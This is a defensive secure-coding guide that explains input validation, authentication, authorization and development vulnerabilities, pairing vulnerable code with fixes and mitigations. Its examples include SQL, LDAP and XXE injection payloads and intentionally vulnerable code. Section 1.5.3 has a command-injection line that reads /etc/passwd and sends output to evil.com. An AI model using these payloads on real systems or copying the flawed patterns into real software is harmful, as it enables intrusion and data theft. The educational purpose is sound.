01 Input Validation Issues

Input validation is the process of verifying that data supplied to an application conforms to the expected format, type, length, and range before it is processed. When this boundary fails — through missing validation, incorrect implementation, or trust in attacker-controlled data — applications become exposed to some of the most exploited vulnerability classes in computing.[31] Exploitation of input handling flaws consistently ranks among the top causes of security incidents across all software categories.[1]

The root cause is deceptively simple: software that implicitly trusts its environment. An application processing a form field, parsing a network packet, or reading a configuration file must assume that every external datum is potentially malicious. Failure to enforce this principle — sometimes called the principle of distrust by default — opens the attack surface catalogued in this section.[32]

1.1 Buffer Overflows Critical CWE-120

A buffer overflow occurs when a program writes data beyond the allocated memory boundary of a buffer. Because adjacent memory locations may contain executable code, return addresses, or function pointers, an attacker who controls the overflow can redirect program execution.[6] Aleph One's seminal 1996 paper "Smashing the Stack for Fun and Profit" demonstrated how stack-based overflows could reliably overwrite saved return addresses and inject shellcode — a technique that remains conceptually foundational to modern exploit development.[3]

"The buffer overflow is to security what the null pointer dereference is to stability: a foundational failure that cascades unpredictably through the system."

— Gary McGraw, Software Security: Building Security In[31]

Mechanism

Stack-based overflows corrupt the stack frame, enabling overwriting of the saved return address (RIP/EIP). Heap-based overflows target dynamically allocated regions and can corrupt heap metadata, adjacent objects, or function pointers. Both classes can lead to arbitrary code execution or denial of service.[14]

/* VULNERABLE: strcpy performs no bounds check */
void process_input(char *user_input) {
    char buf[64];
    strcpy(buf, user_input);   /* overflows if len(user_input) > 63 */
}

/* SAFE: strncpy with explicit bound */
void process_input_safe(char *user_input) {
    char buf[64];
    strncpy(buf, user_input, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';   /* always null-terminate */
}
Attack Vectors
  • Crafted input exceeding buffer capacity
  • Format string exploits (%n, %x leaks)
  • Return-oriented programming (ROP) chains
  • Heap spray preceding overflow
  • Off-by-one errors in loop bounds
Mitigations
  • Use memory-safe languages (Rust, Go, Java)
  • Bounds-checked string functions (strncat, snprintf)
  • Enable ASLR, DEP/NX, stack canaries
  • Static analysis (Coverity, CodeQL) in CI
  • Compiler flags: -fstack-protector-strong, SafeStack
⚠
Real-World Impact
The Heartbleed vulnerability (CVE-2014-0160) in OpenSSL was a heap buffer over-read in the TLS heartbeat extension, allowing attackers to read 64 KB of server memory per request — leaking private keys, session tokens, and credentials without leaving traces in standard logs.[14]

1.2 Integer Overflows High CWE-190

Integer overflow occurs when an arithmetic operation produces a result exceeding the maximum value representable by the integer type, causing it to wrap around. This is particularly dangerous when the wrapped value controls memory allocation sizes, loop bounds, or array indices, silently converting what should be a "too large" error into an exploitable under-allocation.[26]

Integer overflows frequently act as the precondition for a subsequent buffer overflow. A classic pattern involves computing a buffer size with arithmetic that overflows to a small value, allocating the under-sized buffer, then writing attacker-controlled data into it — a two-stage exploit that defeated many early input-length defenses.[14]

/* VULNERABLE: multiplication overflows on large values */
size_t num_items = attacker_controlled_value;
size_t item_size = 1024;
/* If num_items = 0x1000001, result wraps to 0x400 on 32-bit */
char *buf = malloc(num_items * item_size);
memcpy(buf, data, num_items * item_size); /* heap overflow */

/* SAFE: check before multiplication */
if (num_items > SIZE_MAX / item_size) {
    return ERROR_TOO_LARGE;
}
char *buf = malloc(num_items * item_size);
◈
Signed vs. Unsigned Hazards
In C and C++, signed integer overflow is formally undefined behaviour, permitting compilers to perform optimisations that eliminate security-critical overflow checks. Use __builtin_add_overflow() (GCC/Clang) or the checked_arithmetic crate (Rust) for portable overflow detection.[14]

1.3 Memory Leaks Medium CWE-401

A memory leak occurs when a program allocates heap memory but fails to release it after use, causing resident memory to grow without bound over the lifetime of the process.[27] While not directly exploitable in the same way as buffer overflows, memory leaks constitute a meaningful security concern: they enable denial-of-service attacks through resource exhaustion, may expose sensitive data in unreleased heap regions, and in certain allocator implementations can produce predictable heap layouts that assist exploitation of adjacent vulnerabilities.[4]

/* VULNERABLE: allocation without guaranteed deallocation */
char* read_config(const char *path) {
    char *buf = malloc(4096);
    if (!load_file(path, buf)) {
        return NULL;   /* leaked: buf never freed on error path */
    }
    return buf;
}

/* SAFE: free on all exit paths */
char* read_config_safe(const char *path) {
    char *buf = malloc(4096);
    if (!load_file(path, buf)) {
        free(buf);
        return NULL;
    }
    return buf;
}

Modern mitigations include automated memory management (garbage collectors in Java, Python, Go), Rust's ownership system which enforces deallocation at compile time, and dynamic analysis tools such as Valgrind and AddressSanitizer that detect leaks at runtime during testing.[14]

1.4 Race Conditions High CWE-362

A race condition arises when a program's correctness depends on the relative ordering or timing of multiple concurrent operations, and that ordering is not enforced.[28] In security contexts, the most commonly exploited subtype is the Time-of-Check to Time-of-Use (TOCTOU) race, where an attacker manipulates a shared resource between the moment it is checked and the moment it is acted upon.[32]

# VULNERABLE TOCTOU: check then use, no atomicity guarantee
import os

def write_report(path, data):
    if os.access(path, os.W_OK):   # attacker symlinks path here
        with open(path, 'w') as f:  # now writes to attacker target
            f.write(data)

# SAFE: use atomic open with O_CREAT | O_EXCL; drop privileges early
import os

def write_report_safe(path, data):
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, 'w') as f:
        f.write(data)

Race conditions in multi-threaded applications are addressed through synchronisation primitives — mutexes, semaphores, and read-write locks — and through lock-free algorithms based on atomic compare-and-swap operations. Goetz et al. provide rigorous guidance on safe concurrent Java design.[29]

1.5 Injection Attacks

Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query. The interpreter cannot distinguish between intended instructions and attacker-supplied data, executing both indiscriminately. Injection ranked third in the OWASP Top Ten 2021, with 94% of tested applications containing some form of injection weakness.[1]

1.5.1 SQL Injection (SQLi) Critical CWE-89

SQL injection is the insertion of malicious SQL code into a query constructed from user-supplied input. Because the attacker's payload is interpreted by the database engine as part of the query structure rather than as a data literal, it can alter query logic, bypass authentication, extract arbitrary data, modify records, or invoke operating-system commands through database-level stored procedures.[7] Clarke's comprehensive treatment documents the technique across every major database platform.[9]

-- Application builds query by string concatenation:
-- query = "SELECT * FROM users WHERE name = '" + username + "'"

-- Attacker submits username:
admin' OR '1'='1

-- Resulting query (always true, returns all rows):
SELECT * FROM users WHERE name = 'admin' OR '1'='1'

-- UNION-based data exfiltration:
admin' UNION SELECT username, password, NULL FROM users --

-- Blind time-based inference (MySQL):
admin' AND SLEEP(5) --
ℹ
SQLi Taxonomy
Classic (in-band) SQLi returns results directly in the application response. Blind SQLi infers data through boolean differences in page content or measurable time delays. Out-of-band SQLi exfiltrates data via DNS or HTTP requests triggered by database functions (e.g., xp_dirtree on MSSQL).[9]
// SAFE: parameterised query — input is never interpreted as SQL
String sql = "SELECT * FROM users WHERE name = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, username);   // username treated as data literal
ResultSet rs = stmt.executeQuery();
Impact
  • Authentication bypass
  • Full database exfiltration
  • Schema and table enumeration
  • Data modification / deletion
  • OS command execution (xp_cmdshell)
  • Lateral movement via linked servers
Mitigations
  • Parameterised queries / prepared statements
  • Stored procedures (with bound params)
  • Strict input allowlisting
  • Least-privilege DB accounts
  • WAF rules (defence in depth only)
  • Regular automated SQLi scans (sqlmap, OWASP ZAP)

1.5.2 LDAP Injection High CWE-90

LDAP injection occurs when user-supplied input is embedded in an LDAP query without proper encoding, allowing an attacker to manipulate query logic against an LDAP directory service such as Active Directory. Because LDAP is widely used for enterprise authentication and authorisation, successful injection can bypass login controls or enumerate sensitive organisational data.[11]

// VULNERABLE: user input interpolated directly into LDAP filter
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";

// Attacker submits username: admin)(&
// Resulting filter — password check eliminated:
(&(uid=admin)(&)(userPassword=anything))

// SAFE: escape special characters per RFC 4515 before embedding
String safeUser = LdapEncoder.filterEncode(username);
String filter = "(&(uid=" + safeUser + ")(userPassword=" + safePass + "))";

Mitigation requires escaping the following LDAP special characters before interpolation: ( ) * \ NUL for search filters, and , + " \ < > ; # = for distinguished names. Libraries such as Spring LDAP provide built-in escaping utilities.[11]

1.5.3 Command Injection Critical CWE-78

Command injection arises when an application passes user-controlled data to a shell or system command without adequate sanitisation. Because shells interpret metacharacters such as ; | && || ` $( ), an attacker can append arbitrary commands that execute with the privileges of the application process.[12]

# VULNERABLE: user input appended to shell command (Python)
import os
filename = request.args.get('file')
os.system(f"cat /reports/{filename}")

# Attacker submits: ../../etc/passwd; curl http://evil.com/$(id)

# SAFE: avoid shell=True; pass argument list; validate input
import subprocess, re
filename = request.args.get('file')
if not re.fullmatch(r'[a-zA-Z0-9_\-]+\.pdf', filename):
    abort(400)
subprocess.run(["cat", f"/reports/{filename}"], check=True, shell=False)
⚠
Full System Compromise
Command injection frequently leads to complete host compromise, since the injected commands run as the web server or application process. If that process runs with elevated privileges — a common misconfiguration — the attacker immediately obtains root or SYSTEM access.[40]

1.5.4 XML Injection & XXE High CWE-91

XML injection covers two related classes. In the first, malicious XML structures alter application logic when user input is embedded in XML documents. In the second — XML External Entity (XXE) injection — an attacker exploits an XML parser configured to process external entity references, using the SYSTEM keyword to read local files, perform server-side request forgery (SSRF), or trigger denial of service through entity expansion (the "Billion Laughs" attack).[13]

<!-- XXE payload: read /etc/passwd via file:// URI -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userdata>&xxe;</userdata>

<!-- Billion Laughs DoS: exponential entity expansion -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>

The primary mitigation is to disable DOCTYPE declarations and external entity processing in the XML parser configuration. OWASP's XXE Prevention Cheat Sheet provides parser-specific settings for Java (JAXP, SAXParser), Python (lxml, expat), .NET (XmlDocument), and others.[13] When XML is not strictly required, prefer JSON for API interchange, as JSON parsers do not process entity declarations.

02 Authentication Vulnerabilities

Authentication is the mechanism by which a system verifies that a principal is who they claim to be. It is the first gate in any multi-layered security model, and its failure is catastrophic: once an attacker holds a valid authenticated identity, they can operate within normal application boundaries, making detection and containment far more difficult.[18] Broken authentication ranked second in the OWASP Top Ten for many consecutive years before being combined with identification failures in the 2021 edition.[1]

2.1 Weak Passwords High

Password weakness is both a user behaviour problem and a system design problem. A password is functionally weak when it falls within a guessable space — common words, keyboard patterns, names, dates, or previously breached credentials — that an attacker can enumerate faster than the authentication system can detect or block.[20] Florêncio and Herley's large-scale study of web password habits demonstrated that a minority of easily-guessed passwords dominate real-world credential sets.[34]

NIST Special Publication 800-63B revised prevailing password guidance substantially in 2017, abandoning mandatory complexity rules (uppercase, symbols, etc.) in favour of minimum length (≥8 characters for user-chosen passwords) and mandatory screening against compromised credential lists.[2] The revised guidance specifically prohibits arbitrary periodic rotation, which research shows causes users to make predictable incremental changes rather than selecting stronger passwords.[2]

Weak Password Patterns
  • Dictionary words and name+year patterns
  • Keyboard walks (qwerty, 123456, asdf)
  • Reuse of previously breached credentials
  • Default vendor credentials left unchanged
  • Passwords matching username or company name
Controls
  • Minimum 12+ characters; no arbitrary complexity rules
  • Screen against HaveIBeenPwned API at registration
  • Adaptive hashing (bcrypt, Argon2id, scrypt)
  • Multi-factor authentication (TOTP, WebAuthn)
  • Account lockout / exponential backoff on failures
# Password hashing: NEVER use MD5, SHA-1, or unsalted hashes
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,       # iterations
    memory_cost=65536, # 64 MiB
    parallelism=4
)

# Storing a new password
hash_value = ph.hash(plaintext_password)

# Verifying at login
try:
    ph.verify(stored_hash, supplied_password)
except VerifyMismatchError:
    abort(401)

2.2 Credential Stuffing High

Credential stuffing is the automated injection of username/password pairs — obtained from prior data breaches — against a target application's login endpoint. Because many users reuse passwords across sites, breach lists from one compromise enable attacks against unrelated services.[33] Unlike brute force attacks that guess passwords, credential stuffing attempts valid credentials already confirmed in other breaches, dramatically increasing success rates while reducing the volume of attempts required.

The attack exploits two compounding failures: password reuse by users and absent or ineffective anomaly detection on the application side. Automated tooling (Sentry MBA, OpenBullet, SilverBullet) enables threat actors to test millions of credential pairs per day using distributed botnets or residential proxies to circumvent IP-based rate limiting.[33]

◈
Scale of the Problem
The Have I Been Pwned data set — aggregating publicly disclosed breach compilations — catalogues billions of email/password combinations. Many credential lists circulate privately before disclosure, meaning organisations face credential stuffing attacks from breaches they are unaware of.[17]

Effective mitigations include multi-factor authentication (eliminating credential-only login), bot detection and CAPTCHA, device fingerprinting to identify automation signatures, and credential screening against known-breach databases at login time. OWASP's Credential Stuffing Prevention Cheat Sheet details detection signals including velocity anomalies and geolocation inconsistencies.[33]

2.3 Password Spraying High

Password spraying is the inverse of traditional brute force: rather than trying many passwords against one account (which triggers lockout), the attacker tries a small number of commonly used passwords against a large number of accounts. Because each account receives only one or two attempts, lockout thresholds are never triggered, and the attack operates below most anomaly-detection baselines.[37]

Password spraying is heavily used in Active Directory environments, where a single compromised domain account enables substantial lateral movement. Common spray passwords include the current month-and-year pattern (e.g., Summer2024!), the organisation name with common suffixes, and seasonal passwords that meet complexity policies while remaining highly guessable.[37]

Attack Characteristics
  • Low attempt count per account (1–3)
  • Timed to stay below lockout threshold
  • Targets enterprise SSO and OWA endpoints
  • Uses predictable seasonal password patterns
  • Difficult to distinguish from normal failures
Mitigations
  • MFA on all internet-facing authentication
  • Distributed lockout monitoring across accounts
  • Block known spray password lists at login
  • Smart lockout (Azure AD Smart Lockout)
  • Impossible travel / unusual geography alerts

2.4 Broken Authentication Critical

Broken authentication is a broad category encompassing implementation flaws in the authentication mechanism itself — beyond the password quality issues described above. OWASP enumerates the following as indicative conditions: permitting automated attacks such as credential stuffing, using weak credentials (default passwords, "Password1"), deploying weak or ineffective credential recovery processes, storing passwords in plaintext or with reversible encryption, using weak hashing (MD5, SHA-1 without salt), missing or bypassable multi-factor authentication, and exposing session identifiers in URLs.[18]

// VULNERABLE: home-grown authentication with multiple flaws
bool authenticate(String user, String pass) {
    // Flaw 1: MD5 without salt
    String hash = MD5.hash(pass);
    // Flaw 2: SQL injection in query (double vulnerability)
    String sql = "SELECT * FROM users WHERE name='" + user
               + "' AND pwd='" + hash + "'";
    // Flaw 3: predictable session token
    session.token = String.valueOf(System.currentTimeMillis());
    return db.execute(sql).hasRows();
}

// SAFE: delegate to proven framework
// Spring Security, Passport.js, Django auth, etc.
// Use parameterised queries, Argon2id, and CSPRNG tokens
✓
Design Principle: Don't Roll Your Own Auth
Authentication is one of the areas where bespoke implementation most reliably introduces critical vulnerabilities. Production systems should use battle-tested frameworks and identity providers (Keycloak, Auth0, AWS Cognito) rather than custom authentication code. OWASP's Authentication Cheat Sheet provides a comprehensive reference for requirements when custom implementation is unavoidable.[18]

2.5 Session Hijacking Critical

Session hijacking is the theft and reuse of a valid session token to impersonate an authenticated user without knowing their credentials. Because web applications maintain authentication state across HTTP requests through session tokens (cookies, URL parameters, or Authorization headers), an attacker who obtains a valid token gains the same access as the legitimate user for the session's duration.[21]

Acquisition methods include network interception of unencrypted sessions (eliminated by enforced HTTPS), cross-site scripting (XSS) that reads document.cookie, session fixation (forcing a known token value before authentication), and physical access to browser storage or application logs that inadvertently record tokens.[21]

# Flask: secure session cookie configuration
app.config.update(
    SESSION_COOKIE_SECURE    = True,    # HTTPS only
    SESSION_COOKIE_HTTPONLY  = True,    # no JS access
    SESSION_COOKIE_SAMESITE  = 'Strict',# CSRF protection
    PERMANENT_SESSION_LIFETIME = timedelta(hours=1),
)

# Regenerate session ID after privilege change (login, sudo)
def login():
    verify_credentials(...)
    session.clear()          # invalidate pre-auth session
    session['user_id'] = uid # issue new token automatically
Hijacking Vectors
  • XSS reading document.cookie
  • Session fixation via URL parameters
  • Network interception (HTTP, Wi-Fi)
  • Log files containing tokens
  • Referrer header leakage
Mitigations
  • HttpOnly + Secure cookie flags
  • Enforce HTTPS / HSTS
  • Regenerate session after auth elevation
  • Absolute and idle session timeouts
  • Bind sessions to IP or device fingerprint

03 Authorization Vulnerabilities

Authorization — determining what an authenticated principal is permitted to do — is distinct from authentication, yet failures in this layer are remarkably common. The OWASP Top Ten 2021 ranked broken access control first, noting that 94% of applications tested exhibited at least one access control failure.[1] Saltzer and Schroeder's foundational 1975 principles of information system protection — least privilege, economy of mechanism, and complete mediation — remain the canonical design requirements against which authorization implementations are evaluated.[23]

3.1 Privilege Escalation Critical CWE-269

Privilege escalation is the process by which an actor gains capabilities beyond those explicitly granted. In vertical escalation, a lower-privileged user gains administrative capabilities. In horizontal escalation, one user gains access to another user's data or functions at the same privilege level.[35] MITRE ATT&CK documents privilege escalation as a distinct tactic (TA0004) with dozens of specific techniques spanning OS vulnerabilities, misconfigurations, and application logic flaws.[37]

// VULNERABLE: role check on client-supplied parameter
app.post('/admin/delete-user', (req, res) => {
    // Attacker simply sends: { "role": "admin" } in request body
    if (req.body.role === 'admin') {
        deleteUser(req.body.targetId);
    }
});

// SAFE: role derived exclusively from server-side session
app.post('/admin/delete-user', requireRole('admin'), (req, res) => {
    // requireRole middleware checks session.user.role — not request body
    deleteUser(req.body.targetId);
});

Local privilege escalation in operating systems typically exploits SUID binaries, writable directories in PATH, weak sudo configurations (NOPASSWD directives), kernel vulnerabilities, or Docker socket access granting effective root. Automated tools such as LinPEAS and WinPEAS enumerate common misconfigurations used during post-exploitation.[37]

◈
Mass Assignment
A related application-level escalation arises from mass assignment (also called auto-binding): frameworks that automatically map HTTP request parameters to object properties may allow attackers to set privileged fields (isAdmin, role, accountBalance) by including them in a form submission or JSON body. Explicit allowlisting of assignable fields is required.[24]
Common Escalation Paths
  • Manipulating role/privilege HTTP parameters
  • Mass assignment of privileged object fields
  • SUID/SGID binary abuse on Linux
  • Misconfigured sudo rules (NOPASSWD)
  • Kernel exploits (Dirty COW, Dirty Pipe)
  • Token impersonation on Windows
Mitigations
  • Derive all roles from server-side session only
  • Explicit field allowlisting in model binding
  • Principle of least privilege for all accounts
  • Regular sudo and SUID binary audits
  • Immutable infrastructure; apply kernel patches
  • Privileged Access Workstations (PAW)

3.2 Insecure Direct Object References (IDOR) High CWE-639

IDOR occurs when an application uses a user-controllable value — typically a database primary key or file path — as a direct reference to an object without verifying that the requesting user has authorisation to access that specific object.[22] The vulnerability is deceptively simple: the application correctly authenticates the user, but fails to verify ownership or permission for each individual resource access.

"IDOR is not a complicated vulnerability — it is the absence of one line of authorisation logic that should always be present. Yet it is among the most common findings in bug bounty reports precisely because that check is consistently omitted."

— OWASP Insecure Direct Object Reference Prevention Cheat Sheet[22] 
// VULNERABLE: order ID taken directly from URL, no ownership check
app.get('/api/orders/:id', authenticate, async (req, res) => {
    // Attacker increments ID to access other users' orders
    const order = await Order.findById(req.params.id);
    res.json(order);
});

// SAFE: filter by both ID and authenticated user's ID
app.get('/api/orders/:id', authenticate, async (req, res) => {
    const order = await Order.findOne({
        _id: req.params.id,
        userId: req.session.userId    // ownership enforced
    });
    if (!order) return res.status(403).json({ error: 'Forbidden' });
    res.json(order);
});

IDOR vulnerabilities are especially prevalent in RESTful APIs, where sequential numeric identifiers in resource URLs create trivially enumerable attack surfaces. Mitigation strategies include substituting predictable identifiers with cryptographically random UUIDs or indirect reference maps that translate user-visible tokens to internal identifiers server-side.[22]

3.3 Excessive Permissions High

Excessive permissions (over-provisioning) is the systematic failure to apply the principle of least privilege: granting principals — users, service accounts, API keys, cloud roles, or microservices — more capabilities than their function requires.[23] While not itself an exploitable vulnerability, excessive permissions dramatically amplify the blast radius of any adjacent vulnerability: a compromised low-privilege component with excessive grants can access or modify resources far beyond its intended scope.

In cloud environments, this manifests as overly permissive IAM policies (attaching AdministratorAccess to service roles), wildcard resource ARNs (arn:aws:s3:::*), and cross-account trust relationships with inadequate conditions. In databases, it appears as application accounts with DDL privileges or access to tables unrelated to the application's function.[25]

# VULNERABLE: Lambda role with full S3 and RDS access
{
  "Effect": "Allow",
  "Action": ["s3:*", "rds:*"],
  "Resource": "*"
}

# SAFE: scoped to the exact bucket and specific actions needed
{
  "Effect": "Allow",
  "Action": ["s3:GetObject", "s3:PutObject"],
  "Resource": "arn:aws:s3:::my-app-bucket/uploads/*"
}
ℹ
Audit Tooling
AWS IAM Access Analyzer, GCP Policy Analyzer, and Azure Access Review automate the detection of overly permissive policies and unused entitlements. Regular access reviews and just-in-time (JIT) privilege elevation systems (HashiCorp Boundary, CyberArk) reduce standing permissions to near-zero.[25]

04 Software Development Issues

A significant category of vulnerabilities is not born from a single misstep in business logic or cryptographic design, but from accumulated patterns of insecure development practice. These vulnerabilities are embedded during the development phase — sometimes deliberately for convenience, sometimes from a lack of security awareness — and survive undetected through testing and into production because they do not manifest as functional defects.[31] Addressing them requires treating security as a first-class quality attribute throughout the Software Development Life Cycle (SDLC), not as a post-deployment patch activity.[30]

4.1 Hardcoded Credentials Critical CWE-798

Hardcoded credentials are authentication secrets — passwords, API keys, private keys, tokens, database connection strings — embedded directly in source code, configuration files committed to version control, or compiled binaries. Because source repositories (public or private) are frequently exposed through misconfigurations, insider access, or supply chain compromise, any secret stored in version control must be treated as compromised.[40]

The problem is pervasive: automated scanning of public GitHub repositories consistently discovers millions of exposed API keys, AWS access key pairs, and database credentials. Rotation of an exposed credential is necessary but insufficient if the root cause — storage in version control — is not addressed, as historical commits remain accessible indefinitely.[39]

# VULNERABLE: credentials hardcoded in application code
import psycopg2

conn = psycopg2.connect(
    host     = "db.internal",
    database = "production",
    user     = "admin",
    password = "Sup3rS3cr3tP@ssword!"
)

# SAFE: load from environment variables or secrets manager
import os, boto3, json

secret = json.loads(
    boto3.client('secretsmanager').get_secret_value(
        SecretId='prod/db/credentials'
    )['SecretString']
)
conn = psycopg2.connect(**secret)
⚠
Secret Sprawl in CI/CD
Build pipelines, container images, Kubernetes manifests, and Terraform state files are common secondary locations for inadvertently stored secrets. Container images should be scanned with tools such as Trivy or Trufflehog. git-secrets and GitGuardian can be integrated as pre-commit hooks and CI/CD gates to block secret introduction before it reaches version control.[40]

Secrets Management Architecture

Production systems should use dedicated secrets management infrastructure: HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, or GCP Secret Manager. These systems provide dynamic secret generation (reducing secret lifetime), fine-grained access control, full audit trails, and automatic rotation capabilities. Applications receive secrets at runtime through environment injection or SDK calls, never through version-controlled files.[25]

4.2 Insecure APIs High

APIs have become the dominant integration mechanism in modern software architectures — REST, GraphQL, gRPC, and WebSocket interfaces expose application functionality that was previously accessible only through server-side-rendered interfaces with built-in session controls. This shift has created a new attack surface that frequently lacks the security controls applied to traditional web applications.[24] The OWASP API Security Top 10 (2023) catalogues the most critical API-specific vulnerability classes, several of which differ meaningfully from the OWASP Web Application Top 10.[24]

// VULNERABLE: GraphQL with introspection enabled in production,
// no query depth limit, and no field-level authorisation
const server = new ApolloServer({
    schema,
    introspection: true,    // exposes full schema to attackers
    // no depthLimit plugin — enables deeply nested query DoS
});

// SAFE: harden GraphQL for production
const server = new ApolloServer({
    schema,
    introspection: process.env.NODE_ENV !== 'production',
    plugins: [
        depthLimitPlugin({ maxDepth: 5 }),
        queryComplexityPlugin({ maxComplexity: 100 }),
        authDirectivePlugin(),    // field-level auth enforcement
    ],
});

Critical API security concerns include Broken Object Level Authorization (BOLA — the API equivalent of IDOR), lack of rate limiting enabling enumeration and brute force, mass assignment through unrestricted request body properties, and the use of API versioning strategies that leave deprecated, less-secured endpoints accessible alongside current versions.[24]

OWASP API Top 10 (2023) Highlights
  • API1: Broken Object Level Authorization
  • API2: Broken Authentication
  • API3: Broken Object Property Level Auth
  • API4: Unrestricted Resource Consumption
  • API5: Broken Function Level Authorization
  • API8: Security Misconfiguration
API Hardening Controls
  • Object-level auth on every endpoint
  • Rate limiting and throttling (429 responses)
  • Input validation and schema enforcement
  • JWT with short expiry and key rotation
  • API gateway with WAF integration
  • Retire deprecated versions promptly

4.3 Lack of Code Signing High

Code signing is the application of a cryptographic signature to executable code, scripts, packages, or container images, enabling consumers to verify both the identity of the signer and the integrity of the artefact. Absence of code signing in a software delivery pipeline allows an attacker who compromises any distribution channel — package registry, CDN, update server, or source repository — to substitute malicious code without detection.[25]

The SolarWinds supply chain attack (2020) demonstrated the catastrophic consequences at scale: attackers with access to the build pipeline injected backdoored code into signed software updates distributed to approximately 18,000 organisations. While the final packages were signed, the signing happened after malicious injection — underlining that signing alone is insufficient without a secure, tamper-evident build process.[40]

# Signing a release artefact with sigstore/cosign
# Step 1: build and tag container image
docker build -t myapp:1.4.2 .
docker push registry.example.com/myapp:1.4.2

# Step 2: sign with cosign (keyless, using OIDC identity)
cosign sign --yes registry.example.com/myapp:1.4.2

# Step 3: verify before deployment (in admission controller)
cosign verify \
  --certificate-identity user@example.com \
  --certificate-oidc-issuer https://accounts.google.com \
  registry.example.com/myapp:1.4.2
ℹ
SLSA and Software Supply Chain Security
The Supply-chain Levels for Software Artefacts (SLSA) framework defines four levels of supply chain integrity, from basic build scripts (SLSA 1) to hermetically reproducible builds with two-party review (SLSA 4). Combining SLSA with SBOM (Software Bill of Materials) generation enables continuous tracking of component provenance and rapid response to newly disclosed vulnerabilities in dependencies.[25]

4.4 Improper Error Handling Medium CWE-209

Improper error handling encompasses two related failure modes. The first is information disclosure through error messages: returning stack traces, SQL query structures, internal IP addresses, file paths, framework versions, or database schema information in error responses visible to users or attackers. The second is failure to handle errors securely: allowing exceptions to propagate in ways that leave the application in an inconsistent, partially authorised, or resource-exhausted state.[38]

Verbose error responses are a primary reconnaissance tool. A SQL error revealing query structure confirms SQLi vulnerability and discloses schema details. A Java stack trace naming library versions enables targeted exploit selection. Even HTTP response code differences between "user not found" and "incorrect password" can fuel account enumeration attacks.[38]

// VULNERABLE: stack trace exposed to client
app.get('/user/:id', async (req, res) => {
    try {
        const user = await User.findById(req.params.id);
        res.json(user);
    } catch (err) {
        // Exposes DB schema, query, file paths, Node version
        res.status(500).json({ error: err.stack });
    }
});

// SAFE: log internally; return opaque reference to client
app.get('/user/:id', async (req, res) => {
    try {
        const user = await User.findById(req.params.id);
        res.json(user);
    } catch (err) {
        const ref = crypto.randomUUID();
        logger.error({ ref, err });   // full details to internal log
        res.status(500).json({
            message: 'An unexpected error occurred.',
            reference: ref             // correlatable, non-revealing
        });
    }
});
Information Disclosed by Errors
  • Database schema and query structure
  • Framework / library versions (CVE targeting)
  • Internal IP addresses and hostnames
  • File system paths and directory structure
  • Username enumeration via differential responses
Secure Error Handling Practices
  • Generic user-facing messages with correlation IDs
  • Structured logging to internal SIEM only
  • Centralised exception handler (Express, Django, Spring)
  • Consistent responses for auth failures (no enumeration)
  • Security-focused error review in code review checklist
✓
Fail Securely
Error handling should default to denial, not access. When an authorisation check or resource lookup throws an unexpected exception, the safest response is to deny the request and log the anomaly — not to attempt recovery in a way that might bypass access controls. OWASP's Error Handling Cheat Sheet describes global error handler patterns for all major frameworks.[38]
